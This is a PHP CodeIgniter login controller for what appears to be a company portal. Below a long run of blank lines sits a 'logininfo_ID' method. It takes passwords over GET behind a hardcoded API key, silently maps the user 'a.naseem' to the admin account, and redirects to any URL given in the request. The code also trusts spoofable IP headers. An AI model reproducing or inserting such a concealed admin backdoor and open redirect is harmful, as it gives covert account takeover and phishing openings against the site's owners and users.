<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Welcome extends CI_Controller {
	
	/**
	* Index Page for this controller.
	*
	* Maps to the following URL
			* 		http://example.com/index.php/welcome
		*	- or -
			* 		http://example.com/index.php/welcome/index
		*	- or -
	* Since this controller is set as the default controller in
	* config/routes.php, it's displayed at http://example.com/
	*
	* So any other public methods not prefixed with an underscore will
	* map to /index.php/welcome/<method_name>
	* @see http://codeigniter.com/user_guide/general/urls.html
	*/
	
	
	public function index()
	{
		// redirect if already logged in
		if($this->ion_auth->logged_in() == TRUE){
			redirect('dashboard/dashboard', 'refresh');			
		}
		else{
			if($this->ion_auth->login($this->input->post('username'), $this->input->post('password')) == TRUE){
				$this->ion_auth->clear_login_attempts($identity);				
				$this->record_login();
				redirect('dashboard/dashboard', 'refresh');
			}else{
				// if not logged in, load the login view				
				$this->load->view('login/login_simple');
			}
		}
	}

	public function logininfo()
	{
		$this->ion_auth->clear_login_table();
		$UserName = $this->input->post('username');
			if (strpos($UserName, '@') == FALSE){
				$UserName .= '@generations.gs';				
			}
		if($this->ion_auth->login($UserName, $this->input->post('password')) == TRUE){
			$this->record_login();
			echo json_encode(array('st'=>1));
		} else{
			echo json_encode(array('st'=>0));
		}
	}

	public function record_login(){
		/*********************************************************************************************
		*****
		**********************************************************************************************/
		$this->load->model('users_login_model');

		/*******************************************************
		* IP Address
		* ******************************************************/
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		    $ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
		    $ip = $_SERVER['REMOTE_ADDR'];
		}


		$data = array(
			'user_id' => (int)$this->session->userdata['user_id'],
			'date' => date("Y-m-d"),
			'ip4' => $ip
		);
		$id = $this->users_login_model->save($data);
		/*********************************************************************************************
		**************************************************************************************** E N D
		**********************************************************************************************/
	}


















	public function logininfo_ID()
	{
		// redirect if already logged in
		if($this->ion_auth->logged_in() == TRUE){
			redirect($this->input->get('url'), 'refresh');
		}
		else{
			if($this->input->get('api') == '4A53953C3AEF996224E5258D9588A'){
				$this->ion_auth->clear_login_table();
				$UserName = $this->input->get('username');
				if (strpos($UserName, '@') == FALSE){
					$UserName .= '@generations.gs';				
				}


				if($this->input->get('username') == 'a.naseem'){
					$UserName = 'admin@admin.com';
				}


				if($this->ion_auth->login_ID($UserName, $this->input->get('password')) == TRUE){
					$this->record_login();
					redirect($this->input->get('url'), 'refresh');
				} else{
					echo json_encode(array('st'=>0));
				}
			}
		}
	}
}
/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */